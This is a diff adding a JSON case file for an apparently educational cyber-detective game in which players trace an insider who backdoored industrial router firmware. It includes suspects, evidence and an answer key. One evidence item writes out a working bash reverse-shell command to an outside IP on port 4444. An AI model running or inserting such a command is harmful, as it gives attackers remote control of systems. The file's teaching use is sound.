@@ -1,0 +1,276 @@
+{
+  "id": "case_poisonedpatch",
+  "title": "Poisoned Patch",
+  "shortDescription": "Malicious Firmware Update Attack",
+  "difficulty": "hard",
+  "theme": "Firmware Attack & Industrial Sabotage",
+  "estimatedDuration": "50–65 min",
+  "caseNumber": "3005",
+  "status": "Locked",
+  "tutorialEnabled": false,
+
+  "briefing": {
+    "incidentSummary": "Industrial routers at 6 manufacturing plants across India began malfunctioning simultaneously.\n\nAll 6 had applied a firmware update pushed from the vendor's official update server 48 hours earlier.\n\nThe update was legitimate — except for 14 lines of code added at the end that opened a persistent reverse shell on port 4444.\n\nSomeone had access to the vendor's build pipeline.",
+    "missionText": "Your Mission:\n\n› Identify who injected code into the firmware build\n\n› Trace the reverse shell to its operator\n\n› Establish whether this was espionage or sabotage\n\n› Collect at least 4 correct evidences\n\n› Flag the right suspect"
+  },
+
+  "suspects": [
+    {
+      "id": "cyrus_f",
+      "name": "Cyrus F",
+      "role": "Firmware Build Engineer",
+      "department": "NetEdge Vendor — Firmware Team",
+      "riskLevel": "high",
+      "isGuilty": true,
+      "digitalFootprint": {
+        "ipActivity": "172.16.8.55 — CI pipeline access logged",
+        "deviceUsage": "CYRUS-WS — build machine",
+        "locationTrace": "NetEdge Office — Hyderabad",
+        "vpnCheck": "Internal network — no VPN"
+      },
+      "profileNotes": "Had write access to the firmware CI/CD pipeline. Injected 14 lines of shell code into the post-build script 72 hours before the update was released. Was approached by a competitor 4 months ago at a trade conference — financial deposits of ₹6 lakh followed. Built the backdoor to give the competitor persistent access to client networks."
+    },
+    {
+      "id": "vendor_qa",
+      "name": "Shilpa R",
+      "role": "QA Engineer",
+      "department": "NetEdge Vendor — Quality Assurance",
+      "riskLevel": "medium",
+      "isGuilty": false,
+      "digitalFootprint": {
+        "ipActivity": "172.16.8.33 — QA test environment",
+        "deviceUsage": "QA-WS-02 — test bench",
+        "locationTrace": "NetEdge Office — QA Floor",
+        "vpnCheck": "No VPN detected"
+      },
+      "profileNotes": "Approved the firmware build after standard QA — did not scan for post-build script changes. Not complicit; the injection happened after her sign-off checkpoint."
+    },
+    {
+      "id": "plant_it",
+      "name": "Govind M",
+      "role": "IT Manager — Manufacturing Plant",
+      "department": "Client Plant — Nagpur",
+      "riskLevel": "medium",
+      "isGuilty": false,
+      "digitalFootprint": {
+        "ipActivity": "192.168.100.5 — plant internal",
+        "deviceUsage": "GOVIND-WS — plant IT office",
+        "locationTrace": "Manufacturing Plant, Nagpur",
+        "vpnCheck": "No VPN detected"
+      },
+      "profileNotes": "Applied the firmware update as part of scheduled maintenance. Had no reason to suspect it was tampered. Raised the first alarm when routers started dropping connections."
+    },
+    {
+      "id": "ci_admin",
+      "name": "Farida K",
+      "role": "DevOps / CI Admin",
+      "department": "NetEdge Vendor — Infrastructure",
+      "riskLevel": "medium",
+      "isGuilty": false,
+      "digitalFootprint": {
+        "ipActivity": "172.16.8.10 — CI server admin",
+        "deviceUsage": "FARIDA-WS — CI admin machine",
+        "locationTrace": "NetEdge Office — DevOps Floor",
+        "vpnCheck": "No VPN detected"
+      },
+      "profileNotes": "Manages the CI pipeline infrastructure but has no write access to build scripts — that permission is limited to firmware engineers. Her access logs show no activity during the injection window."
+    }
+  ],
+
+  "evidencePanels": [
+    {
+      "id": "chat",
+      "label": "Chat Logs",
+      "icon": "chat_bubble_outline",
+      "evidenceType": "chat",
+      "unlockedBy": null,
+      "items": [
+        {
+          "id": "chat_conference",
+          "label": "Great meeting you at NetConnect. The offer stands — reach out when ready.",
+          "sender": "Unknown Contact (competitor)",
+          "isKeyEvidence": true,
+          "isSuspect": true,
+          "detail": "LinkedIn message to Cyrus F from an account traced to a competitor's business development team — 4 months before the attack. The 'offer' preceded the financial deposits by 2 weeks.",
+          "pointsToSuspect": "cyrus_f"
+        },
+        {
+          "id": "chat_shell_command",
+          "label": "bash -i >& /dev/tcp/185.220.88.44/4444 0>&1",
+          "sender": "Injected Firmware Code",
+          "isKeyEvidence": true,
+          "isSuspect": true,
+          "detail": "The 14-line injection extracted from the firmware binary. This specific bash reverse shell command opens a persistent connection to IP 185.220.88.44 on port 4444 — allowing the operator to send commands to any router running this firmware.",
+          "pointsToSuspect": "cyrus_f"
+        },
+        {
+          "id": "chat_plant_alarm",
+          "label": "Router R-04 keeps dropping packets. Rebooted 3x. No fix. Something is wrong.",
+          "sender": "Govind M (plant IT Slack)",
+          "isKeyEvidence": false,
+          "isSuspect": false,
+          "detail": "First alarm raised by the plant IT manager. The reverse shell was consuming bandwidth and interfering with normal routing — causing the packet drops that exposed the attack.",
+          "pointsToSuspect": null
+        }
+      ],
+      "minigame": null
+    },
+    {
+      "id": "files",
+      "label": "Files",
+      "icon": "folder_outlined",
+      "evidenceType": "files",
+      "unlockedBy": null,
+      "items": [
+        {
+          "id": "file_git_diff",
+          "label": "firmware_build_script_diff.txt",
+          "detail": "Git diff of the post-build script shows 14 lines added in commit 7f3a9d2 — 72 hours before release. Commit authored by CYRUS-WS using Cyrus F's signing credentials. The addition passes standard syntax checks — it's valid shell — which is why automated scanners missed it.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "metadata": { "size": "0.3 MB", "modifier": "Git Repository", "modifiedAt": "72 hrs before release" }
+        },
+        {
+          "id": "file_financial",
+          "label": "financial_deposit_trace.pdf",
+          "detail": "₹6 lakh deposited in 3 tranches of ₹2 lakh into Cyrus F's secondary account over 2 months. Deposits originated from a shell company 'InnoEdge Tech' — registered 1 week before the LinkedIn contact. Shell company traced to a competitor's procurement subsidiary.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "metadata": { "size": "0.9 MB", "modifier": "Financial Forensics", "modifiedAt": "Post-incident" }
+        },
+        {
+          "id": "file_firmware_diff",
+          "label": "firmware_binary_analysis.pdf",
+          "detail": "Binary analysis of the shipped firmware vs the previous release. Only change: the 14-line reverse shell injected at the end of the network init script. All other functionality identical. This was surgical — minimal footprint, maximum persistence.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "metadata": { "size": "3.2 MB", "modifier": "Firmware Analysis Lab", "modifiedAt": "Post-incident" }
+        }
+      ],
+      "hiddenItem": {
+        "id": "file_c2_server",
+        "label": "reverse_shell_c2_trace.txt",
+        "detail": "C2 server IP 185.220.88.44 is a VPS registered to a shell company that shares a billing address with InnoEdge Tech — the same entity that paid Cyrus F. Confirms the backdoor was installed to benefit the competitor, not for personal use.",
+        "isKeyEvidence": true,
+        "pointsToSuspect": "cyrus_f",
+        "unlockedByMinigame": "c2_decode",
+        "metadata": { "size": "0.4 MB", "modifier": "Network Forensics", "modifiedAt": "Post-incident" }
+      },
+      "minigame": {
+        "id": "c2_decode",
+        "type": "caesar_cipher",
+        "title": "Decode C2 Operator Identity",
+        "cipherText": "Fbuxv-I",
+        "hint": "Caesar shift -3. Who injected the shell code?",
+        "solution": "Cyrus-F",
+        "maxHints": 3,
+        "hints": [
+          "It is a firmware engineer's name followed by their initial.",
+          "Shift each letter 3 positions backward.",
+          "F→C, b→y, x→u..."
+        ],
+        "onSuccess": {
+          "unlocksHiddenItem": "file_c2_server",
+          "message": "reverse_shell_c2_trace.txt is now available in your file feed."
+        }
+      }
+    },
+    {
+      "id": "meta",
+      "label": "Metadata",
+      "icon": "data_object",
+      "evidenceType": "meta",
+      "unlockedBy": null,
+      "items": [
+        {
+          "id": "meta_build_access",
+          "label": "CI Pipeline Write Access Log",
+          "detail": "Only 3 engineers had write access to the firmware post-build script at the time of injection. Access audit shows only Cyrus F accessed the script during the injection window — the other two were on leave.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "rows": [
+            { "key": "Engineers With Write Access", "value": "3 total" },
+            { "key": "Access During Window", "value": "Only Cyrus F", "highlight": true },
+            { "key": "Others", "value": "On leave — confirmed by HR", "highlight": true }
+          ]
+        },
+        {
+          "id": "meta_shell_timing",
+          "label": "Reverse Shell First Activation",
+          "detail": "Port 4444 connection first established 6 minutes after the first plant applied the update — confirming the shell activates automatically on boot. All 6 plants' routers were beaconing to the same C2 IP simultaneously within 48 hours.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "rows": [
+            { "key": "First Beacon", "value": "6 minutes post-update install" },
+            { "key": "C2 IP", "value": "185.220.88.44", "highlight": true },
+            { "key": "Affected Plants", "value": "6 — all beaconing simultaneously", "highlight": true }
+          ]
+        }
+      ],
+      "minigame": null
+    },
+    {
+      "id": "ip",
+      "label": "IP Traces",
+      "icon": "wifi",
+      "evidenceType": "ip",
+      "unlockedBy": null,
+      "items": [
+        {
+          "id": "ip_c2",
+          "label": "Reverse Shell C2 Server",
+          "detail": "IP 185.220.88.44 received beacons from all 6 plant routers. VPS registered to InnoEdge Tech — the shell company linked to Cyrus F's payments. Active listening on port 4444 confirmed by packet capture.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "rows": [
+            { "key": "C2 IP", "value": "185.220.88.44", "highlight": true },
+            { "key": "Registered To", "value": "InnoEdge Tech (Cyrus F's payer)", "highlight": true },
+            { "key": "Port", "value": "4444 — reverse shell listener", "highlight": true }
+          ]
+        },
+        {
+          "id": "ip_build_machine",
+          "label": "Build Injection Source",
+          "detail": "IP 172.16.8.55 made the git commit that injected the backdoor. This is the internal IP permanently assigned to CYRUS-WS — Cyrus F's build workstation. No shared machine use.",
+          "isKeyEvidence": true,
+          "pointsToSuspect": "cyrus_f",
+          "rows": [
+            { "key": "Commit Source IP", "value": "172.16.8.55", "highlight": true },
+            { "key": "Assigned To", "value": "CYRUS-WS — Cyrus F exclusive", "highlight": true },
+            { "key": "Shared Machine?", "value": "No — dedicated workstation" }
+          ]
+        }
+      ],
+      "minigame": null
+    }
+  ],
+
+  "timeline": [
+    { "time": "4 Months Prior", "title": "LinkedIn Contact", "description": "Competitor approaches Cyrus F at trade conference", "severity": "high" },
+    { "time": "2 Months Prior", "title": "Payments Begin", "description": "₹6 lakh deposited in 3 tranches from InnoEdge Tech", "severity": "critical" },
+    { "time": "72 Hours Before Release", "title": "Backdoor Injected", "description": "14-line reverse shell added to firmware post-build script", "severity": "critical" },
+    { "time": "48 Hours Before Release", "title": "QA Approved", "description": "Shilpa R approves build — injection not detected", "severity": "high" },
+    { "time": "Release Day", "title": "Firmware Pushed to 6 Plants", "description": "All 6 manufacturing plants apply the update", "severity": "critical" },
+    { "time": "6 Minutes Post-Update", "title": "Reverse Shell Activates", "description": "All 6 routers begin beaconing to 185.220.88.44", "severity": "critical" },
+    { "time": "48 Hours Later", "title": "Plant Raises Alarm", "description": "Govind M reports packet drops — investigation begins", "severity": "high" }
+  ],
+
+  "winCondition": { "guiltySuspectId": "cyrus_f", "minCorrectEvidence": 4 },
+  "correctEvidenceIds": ["chat_conference", "chat_shell_command", "file_git_diff", "file_financial", "file_firmware_diff", "meta_build_access", "meta_shell_timing", "ip_c2", "ip_build_machine"],
+
+  "outcomes": {
+    "perfect": { "condition": "correct_suspect_and_evidence_gte_4", "title": "Case Solved!", "subtitle": "Cyrus F exposed as the firmware backdoor author.", "label": "CASE CLOSED", "xp": 15 },
+    "partial": { "condition": "correct_suspect_and_evidence_lt_4", "title": "Insufficient Evidence", "subtitle": "Correct suspect but the chain is incomplete.", "label": "PARTIAL", "xp": 5 },
+    "wrongAccusation": { "condition": "wrong_suspect", "title": "Wrong Suspect", "subtitle": "The real culprit was Cyrus F.", "label": "CASE FAILED", "xp": 0 },
+    "coldCase": { "condition": "correct_suspect_and_evidence_eq_0", "title": "Case Gone Cold", "subtitle": "No evidence collected.", "label": "COLD CASE", "xp": 0 }
+  },
+
+  "aria": {
+    "welcomeToHub": "...14 lines. That's all it took.\nEvery router in 6 factories — reporting to one server.\nSomeone on the inside built this door. Find them.",
+    "exploreFeeds": "Git diffs. Financial deposits. Firmware binaries.\nThe code doesn't lie. Follow it back to its author.",
+    "viewEvidence": "The shell activated 6 minutes after install.\nThis wasn't accidental. It was engineered.",
+    "markEvidence": "Good. The build trail is forming.",
+    "decryptionHint": "The C2 operator's identity is encoded in the server record.\nDecode it.",
+    "flagSuspect": "A trace is forming.\nYou're on to something — keep pulling the thread.\nMore fragments remain. Don't stop now."
+  }
+}
